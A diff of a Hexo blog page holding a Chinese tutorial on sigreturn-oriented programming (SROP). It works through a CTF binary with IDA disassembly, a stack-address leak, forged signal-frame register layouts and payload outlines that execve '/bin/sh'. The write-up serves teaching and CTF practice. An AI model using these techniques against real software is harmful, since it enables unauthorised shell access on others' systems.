@@ -16,7 +16,7 @@
   localSearch: undefined,
   translate: undefined,
   noticeOutdate: undefined,
-  highlight: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
   copy: {
     success: '复制成功',
     error: '复制错误',
@@ -141,7 +141,7 @@
       }
     }
     detectApple()
-    })(window)</script><meta name="generator" content="Hexo 6.2.0"><link rel="stylesheet" href="/css/prism-vs.css" type="text/css"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/1597994478373.jpeg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">42</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">7</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">2</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 清单</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="not-top-img" id="page-header"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">chuwei'blog</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 清单</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav></header><main class="layout" id="content-inner"><div id="post"><div id="post-info"><h1 class="post-title">srop</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-08-06T02:41:45.563Z" title="发表于 2022-08-06 10:41:45">2022-08-06</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-08-02T15:22:53.493Z" title="更新于 2022-08-02 23:22:53">2022-08-02</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="srop"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div><article class="post-content" id="article-container"><h3 id="linux系统调用"><a href="#linux系统调用" class="headerlink" title="linux系统调用"></a>linux系统调用</h3><p>一开始Linux是通过int 0x80中断的方式进入系统调用的，它会 先进行调用者特权级别的检查，然后进行压栈、跳转等操作，这无疑会浪费许多资源。从Linux 2.6开始，就出现了新的系统调用指令sysenter/sysexit ，前者用于从Ring3进入Ring0，后者用于从Ring0返回Ring3，它没有特权级别检查，也没有压栈的操作，所以执行速度更快。</p>
+    })(window)</script><meta name="generator" content="Hexo 6.2.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/1597994478373.jpeg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">43</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">7</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">2</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 清单</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="not-top-img" id="page-header"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">chuwei'blog</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 清单</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav></header><main class="layout" id="content-inner"><div id="post"><div id="post-info"><h1 class="post-title">srop</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-08-06T02:41:45.563Z" title="发表于 2022-08-06 10:41:45">2022-08-06</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-08-02T15:22:53.493Z" title="更新于 2022-08-02 23:22:53">2022-08-02</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="srop"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div><article class="post-content" id="article-container"><h3 id="linux系统调用"><a href="#linux系统调用" class="headerlink" title="linux系统调用"></a>linux系统调用</h3><p>一开始Linux是通过int 0x80中断的方式进入系统调用的，它会 先进行调用者特权级别的检查，然后进行压栈、跳转等操作，这无疑会浪费许多资源。从Linux 2.6开始，就出现了新的系统调用指令sysenter/sysexit ，前者用于从Ring3进入Ring0，后者用于从Ring0返回Ring3，它没有特权级别检查，也没有压栈的操作，所以执行速度更快。</p>
 <h3 id="signal机制"><a href="#signal机制" class="headerlink" title="signal机制"></a>signal机制</h3><p>当有中断或异常产生时，内核会向某个进程发送一个signal，该 进程被挂起并进入内核，然后内核为其保存相应的上下文，再跳转到之前注册好的signal handler中进行处理，待signal handler返回后，内核为该进程恢复之前保存的上下文，最终恢复执行。具体步骤如下。</p>
 <p>（1）一个signal frame被添加到栈，这个frame中包含了当前寄存器的值和一些signal信息；</p>
 <p>（2）一个新的返回地址被添加到栈顶，这个返回地址指向sigreturn系统调用；</p>
@@ -156,86 +156,10 @@
 <p>对于 signal Frame 来说，会因为架构的不同而有所区别，这里给出分别给出 x86 以及 x64 的 sigcontext</p>
 <ul>
 <li><p>x86</p>
-<pre class=" language-lang-c"><code class="language-lang-c">struct sigcontext
-&#123;
-  unsigned short gs, __gsh;
-  unsigned short fs, __fsh;
-  unsigned short es, __esh;
-  unsigned short ds, __dsh;
-  unsigned long edi;
-  unsigned long esi;
-  unsigned long ebp;
-  unsigned long esp;
-  unsigned long ebx;
-  unsigned long edx;
-  unsigned long ecx;
-  unsigned long eax;
-  unsigned long trapno;
-  unsigned long err;
-  unsigned long eip;
-  unsigned short cs, __csh;
-  unsigned long eflags;
-  unsigned long esp_at_signal;
-  unsigned short ss, __ssh;
-  struct _fpstate * fpstate;
-  unsigned long oldmask;
-  unsigned long cr2;
-&#125;;
-</code></pre>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sigcontext</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> gs, __gsh;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> fs, __fsh;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> es, __esh;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> ds, __dsh;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> edi;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> esi;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> ebp;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> esp;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> ebx;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> edx;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> ecx;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> eax;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> trapno;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> err;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> eip;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> cs, __csh;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> eflags;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> esp_at_signal;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> ss, __ssh;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">fpstate</span> * <span class="title">fpstate</span>;</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> oldmask;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> cr2;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 </li>
 <li><p>x64</p>
-<pre class=" language-lang-c"><code class="language-lang-c">struct _fpstate
-&#123;
-  /* FPU environment matching the 64-bit FXSAVE layout.  */
-  __uint16_t        cwd;
-  __uint16_t        swd;
-  __uint16_t        ftw;
-  __uint16_t        fop;
-  __uint64_t        rip;
-  __uint64_t        rdp;
-  __uint32_t        mxcsr;
-  __uint32_t        mxcr_mask;
-  struct _fpxreg    _st[8];
-  struct _xmmreg    _xmm[16];
-  __uint32_t        padding[24];
-&#125;;
-
-struct sigcontext
-&#123;
-  __uint64_t r8;
-  __uint64_t r9;
-  __uint64_t r10;
-  __uint64_t r11;
-  __uint64_t r12;
-  __uint64_t r13;
-  __uint64_t r14;
-  __uint64_t r15;
-  __uint64_t rdi;
-  __uint64_t rsi;
-  __uint64_t rbp;
-  __uint64_t rbx;
-  __uint64_t rdx;
-  __uint64_t rax;
-  __uint64_t rcx;
-  __uint64_t rsp;
-  __uint64_t rip;
-  __uint64_t eflags;
-  unsigned short cs;
-  unsigned short gs;
-  unsigned short fs;
-  unsigned short __pad0;
-  __uint64_t err;
-  __uint64_t trapno;
-  __uint64_t oldmask;
-  __uint64_t cr2;
-  __extension__ union
-    &#123;
-      struct _fpstate * fpstate;
-      __uint64_t __fpstate_word;
-    &#125;;
-  __uint64_t __reserved1 [8];
-&#125;;
-</code></pre>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">fpstate</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="comment">/* FPU environment matching the 64-bit FXSAVE layout.  */</span></span><br><span class="line">  <span class="type">__uint16_t</span>        cwd;</span><br><span class="line">  <span class="type">__uint16_t</span>        swd;</span><br><span class="line">  <span class="type">__uint16_t</span>        ftw;</span><br><span class="line">  <span class="type">__uint16_t</span>        fop;</span><br><span class="line">  <span class="type">__uint64_t</span>        rip;</span><br><span class="line">  <span class="type">__uint64_t</span>        rdp;</span><br><span class="line">  <span class="type">__uint32_t</span>        mxcsr;</span><br><span class="line">  <span class="type">__uint32_t</span>        mxcr_mask;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">fpxreg</span>    _<span class="title">st</span>[8];</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">xmmreg</span>    _<span class="title">xmm</span>[16];</span></span><br><span class="line">  <span class="type">__uint32_t</span>        padding[<span class="number">24</span>];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sigcontext</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">__uint64_t</span> r8;</span><br><span class="line">  <span class="type">__uint64_t</span> r9;</span><br><span class="line">  <span class="type">__uint64_t</span> r10;</span><br><span class="line">  <span class="type">__uint64_t</span> r11;</span><br><span class="line">  <span class="type">__uint64_t</span> r12;</span><br><span class="line">  <span class="type">__uint64_t</span> r13;</span><br><span class="line">  <span class="type">__uint64_t</span> r14;</span><br><span class="line">  <span class="type">__uint64_t</span> r15;</span><br><span class="line">  <span class="type">__uint64_t</span> rdi;</span><br><span class="line">  <span class="type">__uint64_t</span> rsi;</span><br><span class="line">  <span class="type">__uint64_t</span> rbp;</span><br><span class="line">  <span class="type">__uint64_t</span> rbx;</span><br><span class="line">  <span class="type">__uint64_t</span> rdx;</span><br><span class="line">  <span class="type">__uint64_t</span> rax;</span><br><span class="line">  <span class="type">__uint64_t</span> rcx;</span><br><span class="line">  <span class="type">__uint64_t</span> rsp;</span><br><span class="line">  <span class="type">__uint64_t</span> rip;</span><br><span class="line">  <span class="type">__uint64_t</span> eflags;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> cs;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> gs;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> fs;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> __pad0;</span><br><span class="line">  <span class="type">__uint64_t</span> err;</span><br><span class="line">  <span class="type">__uint64_t</span> trapno;</span><br><span class="line">  <span class="type">__uint64_t</span> oldmask;</span><br><span class="line">  <span class="type">__uint64_t</span> cr2;</span><br><span class="line">  __extension__ <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">      <span class="class"><span class="keyword">struct</span> _<span class="title">fpstate</span> * <span class="title">fpstate</span>;</span></span><br><span class="line">      <span class="type">__uint64_t</span> __fpstate_word;</span><br><span class="line">    &#125;;</span><br><span class="line">  <span class="type">__uint64_t</span> __reserved1 [<span class="number">8</span>];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 </li>
 </ul>
 <h3 id="攻击原理"><a href="#攻击原理" class="headerlink" title="攻击原理"></a>攻击原理</h3><p>仔细回顾一下内核在 signal 信号处理的过程中的工作，我们可以发现，内核主要做的工作就是为进程保存上下文，并且恢复上下文。这个主要的变动都在 Signal Frame 中。但是需要注意的是：</p>
@@ -254,18 +178,7 @@ struct sigcontext
 <p>如下图所示 ，这样当每次 syscall 返回的时候，栈指针都会指向下一个 Signal Frame。因此就可以执行一系列的 sigreturn 函数调用。</p>
 <p><img src="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202204262147472.png" alt="image-20220426214710750"></p>
 <h3 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h3><h4 id="保护检查"><a href="#保护检查" class="headerlink" title="保护检查"></a>保护检查</h4><p><img src="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202204262147473.png" alt="image-20220425180638884"></p>
-<h4 id="IDA分析"><a href="#IDA分析" class="headerlink" title="IDA分析"></a>IDA分析</h4><pre class=" language-lang-c"><code class="language-lang-c">.text:00000000004000B0                 public start
-.text:00000000004000B0 start           proc near               ; DATA XREF: LOAD:0000000000400018↑o
-.text:00000000004000B0                 xor     rax, rax
-.text:00000000004000B3                 mov     edx, 400h       ; count
-.text:00000000004000B8                 mov     rsi, rsp        ; buf
-.text:00000000004000BB                 mov     rdi, rax        ; fd
-.text:00000000004000BE                 syscall                 ; LINUX - sys_read
-.text:00000000004000C0                 retn
-.text:00000000004000C0 start           endp
-.text:00000000004000C0
-.text:00000000004000C0 _text           ends
-</code></pre>
+<h4 id="IDA分析"><a href="#IDA分析" class="headerlink" title="IDA分析"></a>IDA分析</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">00000000004000B</span>0                 public start</span><br><span class="line">.text:<span class="number">00000000004000B</span>0 start           proc near               ; DATA XREF: LOAD:<span class="number">0000000000400018</span>↑o</span><br><span class="line">.text:<span class="number">00000000004000B</span>0                 xor     rax, rax</span><br><span class="line">.text:<span class="number">00000000004000B</span>3                 mov     edx, <span class="number">400</span>h       ; count</span><br><span class="line">.text:<span class="number">00000000004000B</span>8                 mov     rsi, rsp        ; buf</span><br><span class="line">.text:<span class="number">00000000004000B</span>B                 mov     rdi, rax        ; fd</span><br><span class="line">.text:<span class="number">00000000004000B</span>E                 syscall                 ; LINUX - sys_read</span><br><span class="line">.text:<span class="number">00000000004000</span>C0                 retn</span><br><span class="line">.text:<span class="number">00000000004000</span>C0 start           endp</span><br><span class="line">.text:<span class="number">00000000004000</span>C0</span><br><span class="line">.text:<span class="number">00000000004000</span>C0 _text           ends</span><br></pre></td></tr></table></figure>
 <p>可以知道该程序执行的指令为 read(0,$rsp,400)，即向栈顶读入 400 个字符。毫无疑问，这个是有栈溢出的。</p>
 <h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>由于程序中并没有 sigreturn 调用，所以我们得自己构造，正好这里有 read 函数调用，所以我们可以通过 read 函数读取的字节数来设置 rax 的值。重要思路如下</p>
 <ul>
@@ -277,13 +190,7 @@ struct sigcontext
 </ul>
 <h5 id="控制write函数打印栈地址"><a href="#控制write函数打印栈地址" class="headerlink" title="控制write函数打印栈地址"></a>控制write函数打印栈地址</h5><p>我们为什么要打印栈地址呢？我们在第四步中需要知道read函数将我们部署的内容具体写在了栈的哪个位置，所以需要打印出我们想要部署的位置的地址。</p>
 <p>start函数的代码实际上是进行一个read函数的调用，那么这个调用是由系统调用号来决定的</p>
-<pre class=" language-lang-c"><code class="language-lang-c">.text:00000000004000B0                 xor     rax, rax
-.text:00000000004000B3                 mov     edx, 400h
-.text:00000000004000B8                 mov     rsi, rsp
-.text:00000000004000BB                 mov     rdi, rax
-.text:00000000004000BE                 syscall
-.text:00000000004000C0                 retn
-</code></pre>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">00000000004000B</span>0                 xor     rax, rax</span><br><span class="line">.text:<span class="number">00000000004000B</span>3                 mov     edx, <span class="number">400</span>h</span><br><span class="line">.text:<span class="number">00000000004000B</span>8                 mov     rsi, rsp</span><br><span class="line">.text:<span class="number">00000000004000B</span>B                 mov     rdi, rax</span><br><span class="line">.text:<span class="number">00000000004000B</span>E                 syscall</span><br><span class="line">.text:<span class="number">00000000004000</span>C0                 retn</span><br></pre></td></tr></table></figure>
 <p>rdi寄存器里面的值作为系统调用号，那么rdi寄存器里面的值是rax寄存器赋值的，所以关键就在于rax寄存器。如果想要控制执行write，那么势必不能执行xor rax,rax 的操作。那么想控制其他函数需要具备两个条件：</p>
 <ul>
 <li>更改rax寄存器里面的值为1</li>
@@ -303,22 +210,8 @@ struct sigcontext
 <p>那么现在系统调用就变成syscall(1,0,rsp,0x400),即write(0,rsp,0x400).这将会打印从栈顶开始的0x400字节的内容。但是不要忘了，我们部署了三个start_addr，所以还需要从start_addr3的下一位地址进行取值，我们将取到的新栈顶记做stack_addr</p>
 <p><img src="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202204262147478.png" alt="srop5"></p>
 <h5 id="使用sigreturn对read函数调用的寄存器进行部署"><a href="#使用sigreturn对read函数调用的寄存器进行部署" class="headerlink" title="使用sigreturn对read函数调用的寄存器进行部署"></a>使用sigreturn对read函数调用的寄存器进行部署</h5><p>接下来就需要注意了，我们进入构造的阶段。我们需要通过sigreturn的调用来实现对read函数调用寄存器的部署。在部署之前我们需要之想好在哪几个寄存器中部署什么值，</p>
-<pre><code>----------------------------------
-| 寄存器和指令 |      存储数据      | 
-----------------------------------
-|    rax     |  read函数系统调用号 | 
-----------------------------------
-|    rdi     |         0         | 
-----------------------------------
-|    rsi     |    stack_addr     | 
-----------------------------------
-|    rdx     |       0x400       | 
-----------------------------------
-|    rsp     |    stack_addr     | 
-----------------------------------
-|    rip     |    syscall_ret    | 
-----------------------------------
-</code></pre><p>前面write函数执行结束之后，执行ret时的rsp指针指向即start_addr3位置。在执行ret返回后rsp指针会进行上移，也就是指向start3_addr的高一个地址，这个时候会第三次执行read函数。这个时候就可以把我们预想的sigreturn调用和read函数寄存器布局写到栈中了，即输入下方payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">----------------------------------</span><br><span class="line">| 寄存器和指令 |      存储数据      | </span><br><span class="line">----------------------------------</span><br><span class="line">|    rax     |  read函数系统调用号 | </span><br><span class="line">----------------------------------</span><br><span class="line">|    rdi     |         0         | </span><br><span class="line">----------------------------------</span><br><span class="line">|    rsi     |    stack_addr     | </span><br><span class="line">----------------------------------</span><br><span class="line">|    rdx     |       0x400       | </span><br><span class="line">----------------------------------</span><br><span class="line">|    rsp     |    stack_addr     | </span><br><span class="line">----------------------------------</span><br><span class="line">|    rip     |    syscall_ret    | </span><br><span class="line">----------------------------------</span><br></pre></td></tr></table></figure>
+<p>前面write函数执行结束之后，执行ret时的rsp指针指向即start_addr3位置。在执行ret返回后rsp指针会进行上移，也就是指向start3_addr的高一个地址，这个时候会第三次执行read函数。这个时候就可以把我们预想的sigreturn调用和read函数寄存器布局写到栈中了，即输入下方payload</p>
 <p><code>payload = start_addr + syscall_ret + frame(read)</code></p>
 <p>输入之后栈中的布局如下图所示，在第三次read函数调用结束之后的ret位会回到当前rsp指向的地址，也就是还会第四次调用read函数，</p>
 <p><img src="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202204262147479.png" alt="srop6"></p>
@@ -332,22 +225,8 @@ struct sigcontext
 <blockquote>
 <p>execve函数的调用我们只需要对rdi寄存器部署，存放/bin/sh字符串所在地址就可以了，rsi寄存器和rdx寄存器置零就可以了<br>不止需要对execve函数所用的寄存器进行部署，还需要考虑/bin/sh字符串放在哪个位置<br>由于前面在部署read函数寄存器的时候rsi寄存器中的值为之前write函数泄露出来的stack_addr，所以这次的位置是从stack_addr开始写的</p>
 </blockquote>
-<pre><code>----------------------------------
-| 寄存器和指令 |      存储数据      | 
-----------------------------------
-|    rax     | execve函数系统调用号| 
-----------------------------------
-|    rdi     |     binsh_addr    | 
-----------------------------------
-|    rsi     |         0         | 
-----------------------------------
-|    rdx     |         0         | 
-----------------------------------
-|    rsp     |    stack_addr     | 
-----------------------------------
-|    rip     |    syscall_ret    | 
-----------------------------------
-</code></pre><p>接下来我们需要考虑的就是/bin/sh字符串应该放在哪个位置，这个时候就需要进行计算了，依照前面部署read函数寄存器的方法，我们也规划一下部署execve在栈中的payload结构</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">----------------------------------</span><br><span class="line">| 寄存器和指令 |      存储数据      | </span><br><span class="line">----------------------------------</span><br><span class="line">|    rax     | execve函数系统调用号| </span><br><span class="line">----------------------------------</span><br><span class="line">|    rdi     |     binsh_addr    | </span><br><span class="line">----------------------------------</span><br><span class="line">|    rsi     |         0         | </span><br><span class="line">----------------------------------</span><br><span class="line">|    rdx     |         0         | </span><br><span class="line">----------------------------------</span><br><span class="line">|    rsp     |    stack_addr     | </span><br><span class="line">----------------------------------</span><br><span class="line">|    rip     |    syscall_ret    | </span><br><span class="line">----------------------------------</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>接下来我们需要考虑的就是/bin/sh字符串应该放在哪个位置，这个时候就需要进行计算了，依照前面部署read函数寄存器的方法，我们也规划一下部署execve在栈中的payload结构</p>
 <p>首先返回到原有的xor  rax,rax命令处，使shell界面等待我们输入，输入的字节长度为15，作为sigreturn的系统调用号存放在rax寄存器中，然后将在栈中部署好的execve寄存器值转移至相应寄存器中完成对execve的调用。函数调用payload如下：</p>
 <blockquote>
 <p>payload_exe = start_addr + syscall_ret + frame(execve)</p>
@@ -359,52 +238,7 @@ struct sigcontext
 <blockquote>
 <p>payload = payload + (0x120 - len(payload)) * ‘\x00’ + ‘/bin/sh\x00’</p>
 </blockquote>
